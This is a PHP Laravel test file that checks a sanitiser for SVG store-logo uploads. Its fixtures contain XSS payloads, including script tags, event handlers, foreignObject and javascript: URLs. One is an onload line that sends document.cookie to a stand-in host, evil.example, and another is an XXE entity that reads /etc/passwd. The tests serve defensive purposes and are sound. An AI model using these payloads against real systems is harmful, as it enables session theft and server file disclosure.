<?php

namespace Tests\Feature\Settings;

use App\Models\Store;
use App\Support\SvgSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * The store logo is the only upload on the platform that accepts SVG, and an
 * SVG is a document the browser executes rather than a picture it draws.
 *
 * Stored under `/storage`, it is served from the dashboard's own hostname — so
 * a `<script>` inside a logo runs with the merchant's session, on the same
 * host the platform panel lives on.
 */
class SvgLogoTest extends TestCase
{
    use RefreshDatabase;

    /**
     * A real temp file with a real SVG mime type.
     *
     * `UploadedFile::fake()->createWithContent()` guesses the mime from the
     * content and lands on `text/plain`, which the `image` rule rejects before
     * any of this code runs — the upload never reaches the sanitiser, and the
     * test passes for the wrong reason.
     */
    private function svgUpload(string $svg): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'svg') . '.svg';
        file_put_contents($path, $svg);

        return new UploadedFile($path, 'logo.svg', 'image/svg+xml', null, true);
    }

    private function upload(string $svg): Store
    {
        Storage::fake('public');

        $store = Store::factory()->create();

        $this->actingAs($store->user)->post('/settings/store', [
            'name' => $store->name,
            'logo' => $this->svgUpload($svg),
        ])->assertSessionHasNoErrors();

        return $store->fresh();
    }

    private function stored(Store $store): string
    {
        return Storage::disk('public')->get($store->logo_path);
    }

    // ── The sanitiser itself ────────────────────────────────────────────

    public function test_a_script_tag_does_not_survive(): void
    {
        $clean = SvgSanitizer::clean(
            '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><circle r="5"/></svg>'
        );

        $this->assertStringNotContainsString('script', $clean);
        $this->assertStringContainsString('<circle', $clean);
    }

    public function test_event_handlers_do_not_survive(): void
    {
        $clean = SvgSanitizer::clean(
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect onclick="alert(2)" width="5" height="5"/></svg>'
        );

        $this->assertStringNotContainsString('onload', $clean);
        $this->assertStringNotContainsString('onclick', $clean);
        $this->assertStringContainsString('<rect', $clean);
    }

    /** The element a deny-list of `<script>` always forgets. */
    public function test_foreign_object_does_not_survive(): void
    {
        $clean = SvgSanitizer::clean(
            '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>'
        );

        $this->assertStringNotContainsString('foreignObject', $clean);
        $this->assertStringNotContainsString('script', $clean);
    }

    public function test_remote_references_do_not_survive(): void
    {
        $clean = SvgSanitizer::clean(
            '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.svg"/><use xlink:href="https://evil.example/y#a"/></svg>'
        );

        $this->assertStringNotContainsString('evil.example', $clean);
    }

    /**
     * A file that reads a server file into itself is still a valid image, and
     * a copy of that file.
     */
    public function test_entity_expansion_does_not_read_server_files(): void
    {
        $clean = SvgSanitizer::clean(
            '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            . '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
        );

        $this->assertStringNotContainsString('root:', (string) $clean);
        $this->assertStringNotContainsString('ENTITY', (string) $clean);
    }

    public function test_a_style_attribute_carrying_a_url_is_dropped(): void
    {
        $clean = SvgSanitizer::clean(
            '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(javascript:alert(1))" width="5" height="5"/></svg>'
        );

        $this->assertStringNotContainsString('javascript', $clean);
    }

    /** A logo that survives sanitising has to still be a logo. */
    public function test_an_ordinary_logo_comes_through_intact(): void
    {
        $clean = SvgSanitizer::clean(
            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
            . '<path d="M4 4h16v16H4z" fill="#0C8261"/>'
            . '<circle cx="12" cy="12" r="4" fill="#C29A2B" opacity="0.8"/></svg>'
        );

        $this->assertStringContainsString('M4 4h16v16H4z', $clean);
        $this->assertStringContainsString('#0C8261', $clean);
        $this->assertStringContainsString('viewBox', $clean);
    }

    public function test_something_that_is_not_svg_is_refused(): void
    {
        $this->assertNull(SvgSanitizer::clean('<html><body>hello</body></html>'));
        $this->assertNull(SvgSanitizer::clean('not xml at all'));
    }

    // ── End to end ──────────────────────────────────────────────────────

    public function test_an_uploaded_logo_is_stored_already_disarmed(): void
    {
        $store = $this->upload(
            '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(`//evil.example?c=`+document.cookie)">'
            . '<script>alert(1)</script><path d="M0 0h10v10H0z" fill="#000"/></svg>'
        );

        $stored = $this->stored($store);

        $this->assertStringNotContainsString('script', $stored);
        $this->assertStringNotContainsString('onload', $stored);
        $this->assertStringNotContainsString('evil.example', $stored);
        // …and it is still the merchant's logo.
        $this->assertStringContainsString('M0 0h10v10H0z', $stored);
    }

    public function test_a_raster_logo_is_untouched(): void
    {
        Storage::fake('public');

        $store = Store::factory()->create();

        $this->actingAs($store->user)->post('/settings/store', [
            'name' => $store->name,
            'logo' => UploadedFile::fake()->image('logo.png', 64, 64),
        ])->assertSessionHasNoErrors();

        $this->assertStringEndsWith('.png', $store->fresh()->logo_path);
    }

    public function test_a_broken_svg_is_refused_rather_than_stored(): void
    {
        Storage::fake('public');

        $store = Store::factory()->create();

        $this->actingAs($store->user)->post('/settings/store', [
            'name' => $store->name,
            'logo' => $this->svgUpload('<svg><unclosed>'),
        ])->assertSessionHasErrors('logo');

        $this->assertNull($store->fresh()->logo_path);
    }
}
